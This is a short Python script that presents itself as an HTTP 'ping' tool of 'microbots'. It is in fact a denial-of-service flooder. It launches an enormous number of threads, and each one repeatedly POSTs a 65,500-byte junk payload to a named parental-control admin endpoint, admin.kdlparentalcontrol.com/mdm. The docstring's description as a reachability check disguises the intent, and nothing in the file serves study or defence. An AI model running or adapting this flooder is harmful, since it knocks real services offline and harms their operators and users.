import requests
import time
import threading

def ping_server(host, count=100000000000, packet_size=65500, bot_id=1):
    """
    Simulates a ping using HTTP requests to check if the server is reachable, with adjustable packet size.
    Args:
        host (str): The server or domain to ping (e.g., "34.120.115.37").
        count (int): Number of requests to send (default is 100000000000).
        packet_size (int): Size of the packet to simulate (in bytes).
        bot_id (int): The ID for this microbot.
    Returns:
        None
    """
    payload = "a" * packet_size  # Create payload
    try:
        print(f"Bot-{bot_id}: Pinging {host}...")
        for i in range(count):
            response = requests.post(host, data=payload)
            print(f"Bot-{bot_id}: Response {response.status_code}")
            time.sleep(1)
    except Exception as e:
        print(f"Bot-{bot_id}: Error - {e}")

def start_microbots(num_bots, host="https://admin.kdlparentalcontrol.com/mdm", ping_interval=0.1, packet_size=65500):
    """
    Starts multiple threads to ping the server.
    """
    threads = []
    for i in range(num_bots):
        thread = threading.Thread(target=ping_server, args=(host, 10, packet_size, i + 65500))
        threads.append(thread)
        thread.start()
        time.sleep(ping_interval)
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    start_microbots(100000000000, "https://admin.kdlparentalcontrol.com/mdm", 0.1, 65500)
